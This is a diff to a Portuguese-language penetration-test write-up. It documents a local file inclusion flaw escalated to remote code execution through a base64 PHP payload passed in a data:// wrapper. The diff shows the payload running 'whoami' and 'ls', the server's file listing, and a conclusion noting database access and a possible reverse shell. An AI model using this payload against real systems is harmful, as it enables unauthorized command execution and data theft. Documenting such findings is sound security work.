@@ -94,10 +94,40 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
 
 ---
 
+### ▶️ Executando `ls`
+```
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls
+
+    
+        BANCO DE DADOS
+    adminhelp
+    backup.php
+    css
+    font-awesome
+    fonts
+    header.php
+    home.php
+    images
+    img
+    index.php
+    js
+    login.php
+    prog
+    robots.txt
+    submit.php
+    uploads
+    webdata
+    )�
+        
+```
+
+---
+
 # 📖 Conclusão
 
 - ✔️ O site apresenta vulnerabilidades de **LFI** que podem evoluir para **RCE** utilizando técnicas de **Base64 Data Wrapper**.  
 - ✔️ Foram identificadas credenciais em **Base64**, sugerindo possível exploração de acesso.  
 - ✔️ Apesar de não exibir diretamente no navegador, os comandos executados podem ser verificados no **código-fonte via DevTools**.
+- ✔️ Acesso ao Banco de Dados e possivel shell reversa.
 
 - ⚡ Essa análise confirma o risco de exposição crítica do sistema.
